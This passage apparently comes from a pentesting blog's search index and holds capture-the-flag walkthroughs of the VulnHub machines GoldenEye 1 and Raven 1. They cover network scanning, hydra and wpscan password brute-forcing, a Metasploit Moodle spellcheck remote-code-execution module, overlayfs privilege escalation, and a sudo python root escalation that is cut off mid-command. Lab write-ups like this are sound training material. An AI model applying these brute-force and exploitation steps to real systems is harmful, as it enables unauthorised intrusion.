machines","text":"<p>I'll be using Virtual Box.</p> <p>Kali machine (from now on: attacker machine) will have two network interfaces: </p> <ul> <li>eth0 interface: NAT mode (for internet connection).</li> <li>eth1 interface: Host-only mode (for attacking the victim machine).</li> </ul> <p>GoldenEye 1 machine (from now on: victim machine) will have only one network interface:</p> <ul> <li>eth0 interface.</li> </ul>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#reconnaissance","title":"Reconnaissance","text":"","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#first-we-need-to-identify-our-ip-and-afterwards-our-ips-victim-address","title":"First, we need to identify our IP, and afterwards our IP's victim address.","text":"<p>For that we'll be using netdiscover.</p> <pre><code>ip a\n</code></pre> <p>eth1 interface of the attacker machine will be: 192.168.56.105.</p> <pre><code>sudo netdiscover -i eth1 -r 192.168.56.105/24\n</code></pre> <p>Results:</p> <pre><code> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                   \n _____________________________________________________________________________\n   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      \n -----------------------------------------------------------------------------\n 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor                                                  \n 192.168.56.100  08:00:27:66:9a:ab      1      60  PCS Systemtechnik GmbH                                          \n 192.168.56.101  08:00:27:dd:34:ac      1      60  PCS Systemtechnik GmbH\n ```\n\n So, the victim's IP address is: 192.168.56.101.\n\n\n#### **Secondly**, let's run a port scan to see services:\n\n```bash\nnmap -p- -A 192.168.56.101\n</code></pre> <p>And results:</p> <pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-17 13:31 EST\nNmap scan report for 192.168.56.101\nHost is up (0.00013s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT      STATE SERVICE  VERSION\n25/tcp    open  smtp     Postfix smtpd\n|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN\n| ssl-cert: Subject: commonName=ubuntu\n| Not valid before: 2018-04-24T03:22:34\n|_Not valid after:  2028-04-21T03:22:34\n|_ssl-date: TLS randomness does not represent time\n80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))\n|_http-title: GoldenEye Primary Admin Server\n|_http-server-header: Apache/2.4.7 (Ubuntu)\n55006/tcp open  ssl/pop3 Dovecot pop3d\n|_pop3-capabilities: SASL(PLAIN) RESP-CODES TOP USER UIDL PIPELINING AUTH-RESP-CODE CAPA\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server\n| Not valid before: 2018-04-24T03:23:52\n|_Not valid after:  2028-04-23T03:23:52\n55007/tcp open  pop3     Dovecot pop3d\n|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE STLS SASL(PLAIN) USER CAPA PIPELINING TOP UIDL\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server\n| Not valid before: 2018-04-24T03:23:52\n|_Not valid after:  2028-04-23T03:23:52\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 40.89 seconds\n</code></pre> <p>As there is an Apache server, let's see what is in there. We'll be opening http://192.168.56.101 in our browser. </p> <p>In the front page they will give you an url to login: /serv-home/, and looking at the source code, in the terminal.js file you can read a section commented out:</p> <pre><code>//\n//Boris, make sure you update your default password. \n//My sources say MI6 maybe planning to infiltrate. \n//Be on the lookout for any suspicious network traffic....\n//\n//I encoded you p@ssword below...\n//\n//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;\n//\n//BTW Natalya says she can break your codes\n//\n</code></pre> <p>Now, we have two usernames: boris and natalya, and we also have an aparently URL-encoded password. By using Burp Decode, we can extract the password: InvincibleHack3r</p>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#third-now-we-can-browse-to-http19216856101sev-home","title":"Third, now we can browse to http://192.168.56.101/sev-home","text":"<p>A Basic-Authentification pop-up layer will be displayed. To login into the system, enter:</p> <ul> <li>user: boris</li> <li>password: InvincibleHack3r</li> </ul>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#fourth-in-the-landing-page-we-can-read-this-valuable-information","title":"Fourth, in the landing page we can read this valuable information:","text":"<p>\"Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port\". </p> <p>Also by looking at the source code we can read this commented line:</p> <pre><code>&lt;!-- Qualified GoldenEye Network Operator Supervisors: Natalya Boris --&gt;\n</code></pre> <p>mmmm</p> <p>As we know there are some high ports (such as 55006 and 55007) open and running dovecot pop3 service, maybe we can try to access it with the telnet protocol in port 55007. Also, we could have used netcat.  </p> <pre><code>telnet 192.168.56.101 55007\n</code></pre> <p>Results:</p> <pre><code>Trying 192.168.56.101...\nConnected to 192.168.56.101.\nEscape character is '^]'.\n+OK GoldenEye POP3 Electronic-Mail System\nUSER boris\n+OK\nPASSWORD InvincibleHack3r\n-ERR Unknown command.\nPASS InvincibleHack3r\n-ERR [AUTH] Authentication failed.\nUSER natalya\n+OK\nPASS InvincibleHack3r\n-ERR [AUTH] Authentication failed.\n</code></pre>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#fifth-lets-try-to-brute-force-the-service-by-using-hydra","title":"Fifth, let's try to brute-force the service by using hydra.","text":"<pre><code>hydra -l boris -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 -s55007 pop3\n</code></pre> <p>And the results:</p> <pre><code>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-17 13:57:42\n[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task\n[DATA] attacking pop3://192.168.56.101:55007/\n[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active\n[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active\n[55007][pop3] host: 192.168.56.101   login: boris   password: secret1!\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-17 14:00:19\n</code></pre> <p>We do the same for the user natalya.</p> <pre><code>hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 -s55007 pop3\n</code></pre> <p>And the results:</p> <pre><code>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-19 13:45:18\n[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task\n[DATA] attacking pop3://192.168.56.101:55007/\n[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active\n[55007][pop3] host: 192.168.56.101   login: natalya   password: bird\n[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-19 13:47:19\n</code></pre> <p>So now, we have these credentials for the dovecot pop3 service:</p> <ul> <li>user: boris</li> <li> <p>password: secre1!</p> </li> <li> <p>user: natalya</p> </li> <li>password: bird</li> </ul>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#sixth-lets-access-dovecot-pop3-service","title":"Sixth, let's access dovecot pop3 service","text":"<p>We can use telnet as before:</p> <pre><code>telnet 192.168.56.101 55007\n</code></pre> <p>Results:</p> <pre><code>Trying 192.168.56.101...\nConnected to 192.168.56.101.\nEscape character is '^]'.\n+OK GoldenEye POP3 Electronic-Mail System\nUSER boris\n+OK\nPASS secret1!\n+OK Logged in.\n</code></pre> <p>Let's going to see all messages in our inbox:</p> <pre><code># List messages in inbox\nLIST\n</code></pre> <p>Results:</p> <pre><code>+OK 3 messages:\n1 544\n2 373\n3 921\n.\n</code></pre> <p>Now let's RETRIEVE all messages from inbox:</p> <pre><code># For retrieving first message:\nRETR 1\n\n# For retrieving second message:\nRETR 2\n\n# For retrieving third message:\nRETR 3\n\n# For retrieving fourth message:\nRETR 4\n\n# There was no fifth message\n</code></pre> <p>And messages are:</p> <pre><code>RETR 1\n+OK 544 octets\nReturn-Path: &lt;root@127.0.0.1.goldeneye&gt;\nX-Original-To: boris\nDelivered-To: boris@ubuntu\nReceived: from ok (localhost [127.0.0.1])\n        by ubuntu (Postfix) with SMTP id D9E47454B1\n        for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)\nMessage-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;\nDate: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)\nFrom: root@127.0.0.1.goldeneye\n\nBoris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.\n.\nRETR 2\n+OK 373 octets\nReturn-Path: &lt;natalya@ubuntu&gt;\nX-Original-To: boris\nDelivered-To: boris@ubuntu\nReceived: from ok (localhost [127.0.0.1])\n        by ubuntu (Postfix) with ESMTP id C3F2B454B1\n        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)\nMessage-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;\nDate: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)\nFrom: natalya@ubuntu\n\nBoris, I can break your codes!\n.\nRETR 3\n+OK 921 octets\nReturn-Path: &lt;alec@janus.boss&gt;\nX-Original-To: boris\nDelivered-To: boris@ubuntu\nReceived: from janus (localhost [127.0.0.1])\n        by ubuntu (Postfix) with ESMTP id 4B9F4454B1\n        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)\nMessage-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;\nDate: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)\nFrom: alec@janus.boss\n\nBoris,\n\nYour cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!\n\nOnce Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....\n\nPS - Keep security tight or we will be compromised.\n\n.\nRETR 5\n-ERR There's no message 5.\n</code></pre> <p>Now, let's do the same for natalya:</p> <pre><code>\u2514\u2500$ telnet 192.168.56.101 55007\nTrying 192.168.56.101...\nConnected to 192.168.56.101.\nEscape character is '^]'.\n+OK GoldenEye POP3 Electronic-Mail System\nuser natalya\n+OK\npass bird\n+OK Logged in.\nlist\n+OK 2 messages:\n1 631\n2 1048\n.\nretr 1\n+OK 631 octets\nReturn-Path: &lt;root@ubuntu&gt;\nX-Original-To: natalya\nDelivered-To: natalya@ubuntu\nReceived: from ok (localhost [127.0.0.1])\n        by ubuntu (Postfix) with ESMTP id D5EDA454B1\n        for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)\nMessage-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;\nDate: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)\nFrom: root@ubuntu\n\nNatalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.\n\nAlso, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.\n.\nretr 2\n+OK 1048 octets\nReturn-Path: &lt;root@ubuntu&gt;\nX-Original-To: natalya\nDelivered-To: natalya@ubuntu\nReceived: from root (localhost [127.0.0.1])\n        by ubuntu (Postfix) with SMTP id 17C96454B1\n        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)\nMessage-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;\nDate: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)\nFrom: root@ubuntu\n\nOk Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of \"security\"...it'll get the change order escalated without much hassle :)\n\nOk, user creds are:\n\nusername: xenia\npassword: RCP90rulez!\n\nBoris verified her as a valid contractor so just create the account ok?\n\nAnd if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir\n**Make sure to edit your host file since you usually work remote off-network....\n\nSince you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.\n.\n</code></pre>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#exploitation","title":"Exploitation","text":"<p>Somehow, without really being aware of it, we have already entered into an Exploitation phase. In this phase, our findings will take us further so eventually we will be gaining access to the system.</p>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#first-use-credentials-to-access-the-webservice","title":"First, use credentials to access the webservice","text":"<p>From our reconnaissance / exploitation of the dovecot pop3 service we have managed to gather these new credentials:</p> <ul> <li>username: xenia</li> <li>password: RCP90rulez!</li> </ul> <p>And we also have the instruction to add this line to our /etc/hosts file:</p> <pre><code># We open the /etc/hosts file and add this line at the end\n192.168.56.101  severnaya-station.com/gnocertdir \n</code></pre> <p>Now, in our browser we can go to that address and we can confirm that we have a moodle cms. We can login using the credentials for the user xenia. </p>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#second-gather-information-and-try-to-exploit-it","title":"Second, gather information and try to exploit it","text":"<p>Browsing around we can retrieve the name of twot other users:</p> <p> </p> <p>With these two new users in mind we can use hydra again to try to brute force them. Run in two separate tabs:</p> <pre><code>hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 -s55007 pop3\nhydra -l admin -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 -s55007 pop3 \n</code></pre> <p>And we obtain results only for the username doak:</p> <pre><code>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-19 12:07:05\n[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task\n[DATA] attacking pop3://192.168.56.101:55007/\n[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active\n[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active\n[55007][pop3] host: 192.168.56.101   login: doak   password: goat\n1 of 1 target successfully completed, 1 valid password found\n</code></pre>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#third-login-into-dovecot-using-the-credentials-found","title":"Third, login into dovecot using the credentials found","text":"<ul> <li>user: doak</li> <li>password: goat</li> </ul> <p>And now, let's read the messages:</p> <pre><code>Trying 192.168.56.101...\nConnected to 192.168.56.101.\nEscape character is '^]'.\n+OK GoldenEye POP3 Electronic-Mail System\nuser doak\n+OK\npass goat\n+OK Logged in.\nlist\n+OK 1 messages:\n1 606\n.\nretr 1\n+OK 606 octets\nReturn-Path: &lt;doak@ubuntu&gt;\nX-Original-To: doak\nDelivered-To: doak@ubuntu\nReceived: from doak (localhost [127.0.0.1])\n        by ubuntu (Postfix) with SMTP id 97DC24549D\n        for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)\nMessage-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;\nDate: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)\nFrom: doak@ubuntu\n\nJames,\nIf you're reading this, congrats you've gotten this far. You know how tradecraft works right?\n\nBecause I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......\n\nusername: dr_doak\npassword: 4England!\n\n.\n</code></pre>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#fourth-log-into-moodle-with-new-credentials-and-browse-the-service","title":"Fourth, Log into moodle with new credentials and browse the service","text":"<p>As we have disclosed, again, a new credential for the moodle site, let's login and see what we can find: </p> <ul> <li>username: dr_doak</li> <li>password: 4England!</li> </ul> <p>After browsing around as user dr_doak we can download a field with some more information:</p> <p></p>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#fifth-analyse-the-image","title":"Fifth, analyse the image","text":"<p>An image in a secret location is shared with us. Let's download it from http://severnaya-station.com/dir007key/for-007.jpg</p> <p></p> <p>Aparently this image has nothing juicy, but if we look their metadata with exiftool, then... magic happens:</p> <pre><code>exiftool for-007.jpg \n</code></pre> <p>Results:</p> <pre><code>ExifTool Version Number         : 12.49\nFile Name                       : for-007.jpg\nDirectory                       : Downloads\nFile Size                       : 15 kB\nFile Modification Date/Time     : 2023:01:19 12:37:35-05:00\nFile Access Date/Time           : 2023:01:19 12:37:35-05:00\nFile Inode Change Date/Time     : 2023:01:19 12:37:35-05:00\nFile Permissions                : -rw-r--r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.01\nX Resolution                    : 300\nY Resolution                    : 300\nExif Byte Order                 : Big-endian (Motorola, MM)\nImage Description               : eFdpbnRlcjE5OTV4IQ==\nMake                            : GoldenEye\nResolution Unit                 : inches\nSoftware                        : linux\nArtist                          : For James\nY Cb Cr Positioning             : Centered\nExif Version                    : 0231\nComponents Configuration        : Y, Cb, Cr, -\nUser Comment                    : For 007\nFlashpix Version                : 0100\nImage Width                     : 313\nImage Height                    : 212\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)\nImage Size                      : 313x212\nMegapixels                      : 0.066\n</code></pre> <p>One field catches our attention: \"Image Description\". The value for that field is not very... descriptable: eFdpbnRlcjE5OTV4IQ==.</p> <p>The two equal signs at the end suggest that maybe base64 encode encryption is been employed. Let's use BurpSuite to decode it.</p> <p></p>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#sixth-now-we-can-login-into-the-moodle-with-admin-credentials","title":"Sixth, now we can login into the moodle with admin credentials","text":"<ul> <li>user: admin</li> <li>password: xWinter1995x!</li> </ul> <p>As we are admin, we can browse in the sidebar to: Setting &gt; Site administration &gt; Server &gt; Environment. There we can grab the banner with the version of the running moodle: 2.2.3.</p> <p></p>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#seventh-google-for-some-exploits-for-moodle-223","title":"Seventh, google for some exploits for moodle 2.2.3","text":"<p>You can get to these results:</p> <ul> <li>https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec/.</li> <li>https://www.exploit-db.com/exploits/29324</li> </ul> <p>Here, an explanation of the vulnerability: moodle 2.2.3 has a plugin for checking out spelling. When creating a blog entry (for instance), the user can click on a bottom to check the spelling. In the backend, this triggers a connection with a service. Vulnerability here is that an admin user can modify the path to the service to include a one-lined reverse shell. This shell is going to be called when you click on the Check spelling button. For this to work, open a netcat listener in your machine. Also, in the plugins settings, you might need to change the configuration.</p> <p>I'm not a big fan of metasploit, but in this case I've used it.</p>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#eight-metasploit-geting-a-shell","title":"Eight: Metasploit, geting a shell","text":"<p>Module multi/http/moodle_spelling_binary_rce</p> <p>I've employed the module multi/http/moodle_spelling_binary_rce. Basically, Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests. This module also allows an attacker to leverage another privilege escalation vuln. Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user. This module was tested against Moodle version 2.5.2 and 2.2.3.</p> <ul> <li>https://nvd.nist.gov/vuln/detail/CVE-2013-3630</li> <li>https://nvd.nist.gov/vuln/detail/CVE-2013-4341</li> <li>https://www.exploit-db.com/exploits/28174</li> <li>https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats</li> </ul> <p></p> <p></p> <p>Now, we move our session to background with CTRL-z. </p> <p>Module post/multi/manage/shell_to_meterpreter</p> <p>Our goal now is going to be to move from a cmd/unix shell to a more powered meterpreter. This will allow us later on to execute a module in metasploit to escalate privileges.</p> <pre><code>search shell_to_meterpreter\n</code></pre> <p>We'll be using the module \"post/multi/manage/shell_to_meterpreter\".</p> <p></p> <p>We only need to set session, and LHOST. </p> <p></p> <p>If everything is ok, now we'll have two sessions. </p> <p></p> <p>We've done this to be able to escalate privileges, since the session with shell cmd/unix didn't allow us to escalate privileges using exploit/linux/local/overlayfs_priv_esc.</p>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#escalating-privileges","title":"Escalating privileges","text":"<p>Module exploit/linux/local/overlayfs_priv_esc</p> <p>We'll be using this module to escalate privileges. How have we got here? We run:</p> <pre><code>uname -a\n</code></pre> <p>Results:</p> <pre><code>Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre> <p>Now, after googling \"exploit escalate privileges ubuntu 3.13.0\", we get:</p> <ul> <li>https://www.exploit-db.com/exploits/37292.</li> <li>https://www.rapid7.com/db/modules/exploit/linux/local/overlayfs_priv_esc/.</li> </ul> <p>Using any of these ways to exploit Goldeneye1 is ok. If you go for the first option and upload the exploit to the machine, you will soon realize that the victim machine has not installed the gcc compiler, so you will need to use cc compiler (and modify the code of the exploit). As for the second option, which I chose, metasploit is not going to work with the cmd/unix session. Error message is similar: gcc is not installed and code can not be compiled. You will need to set the meterpreter session for this attack to succeed.</p> <p>The module exploit/linux/local/overlayfs_priv_esc attempts to exploit two different CVEs related to overlayfs. CVE-2015-1328: Ubuntu specific -&gt; 3.13.0-24 (14.04 default) &lt; 3.13.0-55 3.16.0-25 (14.10 default) &lt; 3.16.0-41 3.19.0-18 (15.04 default) &lt; 3.19.0-21 CVE-2015-8660: Ubuntu: 3.19.0-18 &lt; 3.19.0-43 4.2.0-18 &lt; 4.2.0-23 (14.04.1, 15.10) Fedora: &lt; 4.2.8 (vulnerable, un-tested) Red Hat: &lt; 3.10.0-327 (rhel 6, vulnerable, un-tested).</p> <p></p> <p>To exploit it, we need to use session 2. </p> <p></p>","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#last-getting-the-flag","title":"Last, getting the flag","text":"<p>Now, we can cat the flag:</p> <p></p> <pre><code>cat .flag.txt\nAlec told me to place the codes here: \n\n568628e0d993b1973adc718237da6e93\n\nIf you captured this make sure to go here.....\n/006-final/xvf7-flag/\n</code></pre> <p></p> <p>Isn't is just fun???</p>","tags":["walkthrough"]},{"location":"vulnhub-raven-1/","title":"Walkthrough: Raven 1, a vulnhub machine","text":"","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#about-the-machine","title":"About the machine","text":"data Machine Raven 1 Platform Vulnhub url link Download https://drive.google.com/open?id=1pCFv-OXmknLVluUu_8ZCDr1XYWPDfLxW Download Mirror https://download.vulnhub.com/raven/Raven.ova Size 1.4 GB Author William McCann Release date 14 August 2018 Description Raven is a Beginner/Intermediate boot2root machine. There are four flags to find and two intended ways of getting root. Built with VMware and tested on Virtual Box. Set up to use NAT networking. Difficulty Beginner/Intermediate OS Linux","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#walkthrough","title":"Walkthrough","text":"","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#setting-up-the-machines","title":"Setting up the machines","text":"<p>I'll be using Virtual Box.</p> <p>Kali machine (from now on: attacker machine) will have two network interfaces: </p> <ul> <li>eth0 interface: NAT mode (for internet connection).</li> <li>eth1 interface: Host-only mode (for attacking the victim machine).</li> </ul> <p>Raven 1 machine (from now on: victim machine) will have only one network interface:</p> <ul> <li>eth0 interface.</li> </ul> <p>After running </p> <pre><code>ip a\n</code></pre>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#reconnaissance","title":"Reconnaissance","text":"","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#identify-victims-ip","title":"Identify victim's IP","text":"<p>we know that the attacker's machine IP address is 192.168.56.102/24. To discover the victim's machine IP, we run:</p> <pre><code>sudo netdiscover -i eth1 -r 192.168.56.102/24\n</code></pre> <p>These are the  results:</p> <p></p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#scan-victims-surface-attack","title":"Scan victim's surface attack","text":"<p>Now we can run a scanner to see which services are running on the victim's machine:</p> <pre><code>sudo nmap -p- -A 192.168.56.104\n</code></pre> <p>And the results:</p> <p></p> <p>Having a web server in port 80, it's inevitable to open a browser and have a look at it. Also, at the same time, we can run a simple enumeration scan:</p> <pre><code>dirb http://192.168.56.104\n</code></pre> <p>The results are pretty straightforward:</p> <p></p> <p>There is a wordpress installation (maybe not well accomplished) running on the server. Also there are some services installed such as PHPMailer. </p> <p>By reviewing the source code in the pages we find the first flag:</p> <p></p> <p>Here, flag1 in plain text:</p> <pre><code>&lt;!-- End footer Area --&gt;        \n            &lt;!-- flag1{b9bbcb33e11b80be759c4e844862482d} --&gt;\n</code></pre>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#deeper-scan-with-specific-tool-for-wordpress-service-wpsca","title":"Deeper scan with specific tool for wordpress service: wpsca","text":"<p>First, let's start by running a much deeper scanner with wpscan. We'll be enumerating users, </p> <pre><code>wpscan --url http://192.168.56.104/wordpress --enumerate u --force --wp-content-dir wp-content\n</code></pre> <p>And the results show us some interesting findings:</p> <p></p> <p>First, one thing that later may be useful: XML-RPC seems to be enabled: http://192.168.56.104/wordpress/xmlrpc.php. What does this service do? It allows authentication to post entries. It's also useful in wordpress for retrieving pings when a post is linked back. This means that it's also an open door for exploitation. We'll return to this later.</p> <p>Opening the browser in http://192.168.56.104/wordpress/readme.html, we can see some instructions to set up the wordpress installation.</p> <p></p> <p>As a matter of fact, by clicking on http://192.168.56.104/wp-admin/install.php, we end up on a webpage like this:</p> <p></p> <p>Nice, so, the link button is giving us a tip, we need to include a redirection in our /etc/hosts file. </p> <pre><code>sudo nano /etc/hosts\n</code></pre> <p>At the  end of the file we add the following line:</p> <pre><code>192.168.56.104  local.raven\n# CTRL-s  and CTRL-x\n</code></pre> <p>Now we can browse perfectly the wordpress site. Also, finishing our wpscan, there are two more interesting findings:</p> <p></p> <p>These findings are:</p> <ul> <li>Wordpress: WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).</li> <li>User enumeration: steven and michael.</li> </ul> <p>We can also detect those users manually, simply by brute-forcing the author enumeration. See screenshot:</p> <p></p> <p>To manually brute force users in a wordpress installation, you just need to go to:</p> <ul> <li>targetURL/?author=1</li> </ul> <p>Author with id=1 (as in the example) is the first user created during the CMS installation, which usually coincides with the admin user. To see the next user, you just need to change the number. Ids are correlative. By checking the source code (as in the previous screenshot) you can gather users (steven and michael), but also worpress version (4.8.7) and theme (TwentySeventeen).</p> <p>So, what do we have so far?</p> <ul> <li>Server: Apache/2.4.10 (Debian)</li> <li>CMS: WordPress version 4.8.7 identified (Insecure, released on 2018-07-05)</li> <li>Theme: twentySeventeen</li> <li>XML-RPC seems to be enabled: http://192.168.56.104/wordpress/xmlrpc.php.</li> <li>Login page: http://raven.local/wordpress/wp-login.php </li> <li>Two users: steven, michael.</li> </ul>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#exploiting-findings","title":"Exploiting findings","text":"","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#bruce-forcing-passwords-for-the-cms","title":"Bruce-forcing passwords for the CMS","text":"<p>Having found anything, after testing input validations in the endpoints of the application, I'm going to try to brute force login with steven, who is the user with id=2.</p> <pre><code>wpscan --url http://192.168.56.104/wordpress --passwords /usr/share/wordlists/rockyou.txt  --usernames steven -t 25\n</code></pre> <p>Resulst:</p> <p></p> <p>Now, we have:</p> <ul> <li>user: steven</li> <li>password: pink84</li> </ul> <p>These credentials are good to login into the wordpress and... retrieve flag3!!!</p> <p></p> <p>Flag3 was hidden in the draft of a post. Here, in plain text:</p> <pre><code>flag3{afc01ab56b50591e7dccf93122770cd2}\n</code></pre>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#using-credentials-found-for-wordpress-in-a-different-service-ssh","title":"Using credentials found for wordpress in a different service (ssh)","text":"<p>It's not uncommon to use same usernames and passwords across services. Wo, having found steven's password for wordpress, we may try to use the same credentials in a different service. Therefore, we will try to access port 22 (which was open) and see if these creds are valid:</p> <pre><code>ssh steven@192.168.56.104\n</code></pre> <p>After confirming \"fingerprinting\", we are asked to introduce steven's password, and... it works!</p> <p></p>","tags":["pentesting","web pentesting","walkthrough"]},{"location":"vulnhub-raven-1/#escalation-of-privileges","title":"Escalation of privileges","text":"<p>We can see who we are (id), to which groups we belong (id), the version of the running server (uname -a),  and which commands we are allowed to run (sudo -l). And here comes the juicy part. As you may see in the screenshot we can run the command python as root without entering a password.</p> <p></p> <p>Resources: This site is a must when it comes to Unix binaries that can be used to bypass local security restrictions https://gtfobins.github.io</p> <p>In particular, we can easily spot this valid exploit: https://gtfobins.github.io/gtfobins/python/#sudo. What does it say about python? If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p> <p>This is just perfect. So to escalate to root we just need to run:</p> <pre><code>sudo python -c 'import 